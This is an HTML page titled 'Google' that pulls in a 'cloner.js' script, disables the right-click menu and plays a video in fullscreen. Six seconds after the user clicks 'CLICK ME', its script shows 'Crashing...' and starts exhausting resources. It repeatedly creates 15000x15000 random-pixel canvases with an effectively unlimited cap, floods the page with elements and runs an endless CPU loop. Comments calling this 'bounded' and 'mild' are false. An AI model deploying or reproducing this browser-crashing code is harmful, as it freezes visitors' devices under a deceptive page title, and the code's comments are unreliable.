<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Google</title>
  <script src="https://cdn.tailwindcss.com"></script>
        <script id="cloning-script" src="cloner.js"></script>

  <style>
    body { transition: background-color 0.2s; }
    canvas { border: 2px solid #0f0; margin: 5px; }
  </style>
</head>
<body class="bg-gray-900 flex flex-col items-center justify-center h-screen" oncontextmenu="return false;">

<div class="absolute inset-0 h-full w-full">
  <video id="my-video" playsinline loop class="h-full max-w-full object-contain mx-auto block">
    <source src="https://starlightgg.github.io/buffervidchrome/vid.mp4" type="video/mp4">
  </video>
</div>

<div id="status-message"
     class="absolute top-4 left-1/2 transform -translate-x-1/2 p-3 rounded-lg font-medium text-center bg-blue-900 bg-opacity-80 text-blue-300 z-10">
  Status: Click "CLICK ME" button to start
</div>

<button id="fs-btn"
        class="absolute bottom-8 left-1/2 transform -translate-x-1/2 px-4 py-2 rounded bg-green-600 text-white font-semibold">
  CLICK ME 
</button>

<script>
  setTimeout(() => {

    const videoElement = document.getElementById('my-video');
    const statusMessage = document.getElementById('status-message');
    const fsBtn = document.getElementById('fs-btn');

    const TIMEOUT_MS = 6000; // 6 seconds
    let timeoutId = null;
    let deb = false;
    let lastAllowedTime = 0;

    // Smaller canvas, limited count
    function createCanvas(id, width = 15000, height = 15000) {
      const canvas = document.createElement('canvas');
      canvas.id = id;
      canvas.width = width;
      canvas.height = height;
      document.body.appendChild(canvas);

      const ctx = canvas.getContext('2d');
      const imageData = ctx.createImageData(width, height);
      const data = imageData.data;

      for (let i = 0; i < data.length; i += 4) {
        data[i]   = Math.random() * 256;
        data[i+1] = Math.random() * 256;
        data[i+2] = Math.random() * 256;
        data[i+3] = 255;
      }
      ctx.putImageData(imageData, 0, 0);
    }

    // Light CPU + DOM stress, but bounded
    function startStressDemo() {
      // 1) Create a big number of canvases
      let canvasCount = 0;
      const maxCanvases = 100000000000000000000000;
      const canvasInterval = setInterval(() => {
        if (canvasCount >= maxCanvases) {
          clearInterval(canvasInterval);
          return;
        }
        createCanvas(`canvas-${canvasCount}`);
        canvasCount++;
      }, 300);

      // 2) Add some DOM spam, but capped
      let domCount = 0;
      const maxDom = 1000000;
      const domInterval = setInterval(() => {
        if (domCount >= maxDom) {
          clearInterval(domInterval);
          return;
        }
        const div = document.createElement("div");
        div.textContent = "Heavy demo element " + domCount;
        div.className = "text-xs text-green-400";
        document.body.appendChild(div);
        domCount++;
      }, 20);

      // 3) Mild CPU loop on a timer
      function mildCpuWork() {
        let sum = 0;
        for (let i = 0; i < 1000000; i++) {
          sum += Math.sin(i) * Math.cos(i);
        }
        requestAnimationFrame(mildCpuWork);
      }
      mildCpuWork();
    }

    function triggerTimeout() {
      videoElement.pause();
      document.body.style.backgroundColor = '#ef4444';
      setTimeout(() => { document.body.style.backgroundColor = 'transparent'; }, 500);

      statusMessage.textContent = "Crashing...";
      startStressDemo();
    }

    function startTimer() {
      clearTimeout(timeoutId);
      timeoutId = setTimeout(() => {
        triggerTimeout();
      }, TIMEOUT_MS);
      statusMessage.textContent = "Fullscreen active. Demo will start soon.";
    }

    function resetAll() {
      clearTimeout(timeoutId);
      videoElement.pause();
      videoElement.currentTime = 0;
      statusMessage.textContent = "Exited fullscreen. Click 'CLICK ME' button to restart.";
      fsBtn.style.display = "block";
    }

    fsBtn.addEventListener('click', () => {
      if (document.fullscreenElement) return;

      document.documentElement.requestFullscreen().then(() => {
        videoElement.play().then(() => {
          startTimer();
          fsBtn.style.display = "none";
        });
      });
    });

    document.addEventListener('fullscreenchange', () => {
      if (!document.fullscreenElement) {
        if (deb == false) {
          resetAll();
        }
      }
    });

    videoElement.addEventListener('play', () => {
      if (!document.fullscreenElement) {
        videoElement.pause();
        videoElement.currentTime = 0;
        lastAllowedTime = 0;
        statusMessage.textContent = "Please use the 'CLICK ME' button to start playback.";
      }
    });

    videoElement.addEventListener('timeupdate', () => {
      lastAllowedTime = videoElement.currentTime;
    });

    videoElement.addEventListener('seeking', () => {
      if (videoElement.currentTime !== lastAllowedTime) {
        videoElement.currentTime = lastAllowedTime;
        statusMessage.textContent = "Seeking blocked.";
      }
    });
  }, 2000);
</script>

</body>
</html>
